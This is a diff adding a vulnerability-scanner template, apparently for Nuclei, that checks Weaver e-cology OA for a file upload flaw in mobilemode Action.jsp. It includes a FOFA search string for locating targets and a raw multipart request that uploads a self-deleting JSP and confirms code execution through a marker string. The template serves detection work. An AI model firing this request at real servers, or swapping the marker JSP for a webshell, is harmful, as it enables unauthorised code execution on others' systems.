@@ -1,0 +1,47 @@
+id: fanwei-ecology-action-fileupload
+
+info:
+  name: fanwei-ecology-action-fileupload
+  author: unknow
+  severity: critical
+  description: 泛微e-cology OA action.jsp 存在文件上传漏洞。
+  tags: ecology,fileupload
+  metadata:
+    fofa-qeury: body="/wui/common/css/w7OVFont.css"
+
+http:
+  - raw:
+    - |
+      POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1
+      Host: 
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRoL5N5mD7MRNEdNE
+      User-Agent: Mozilla/5.0 
+
+
+      ------WebKitFormBoundaryRoL5N5mD7MRNEdNE
+      Content-Disposition: form-data; name="upload"; filename="test.jsp"
+      Content-Type: text/plain
+
+      <%
+        out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("YzEyYjEwMTIwYmM5ZjQ0NGFmY2I2NDYyMmYzOGJiMjE=")));
+        new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryRoL5N5mD7MRNEdNE--
+    - |
+      GET /mobilemode/upload/images/{{filetext}} HTTP/1.1
+      Host: 
+      User-Agent: Mozilla/5.0     
+
+    extractors:
+      - type: regex
+        name: filetext
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "/mobilemode/upload/images/(.*)\',\'title"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2, "c12b10120bc9f444afcb64622f38bb21") && contains(header_2, "text/html")'
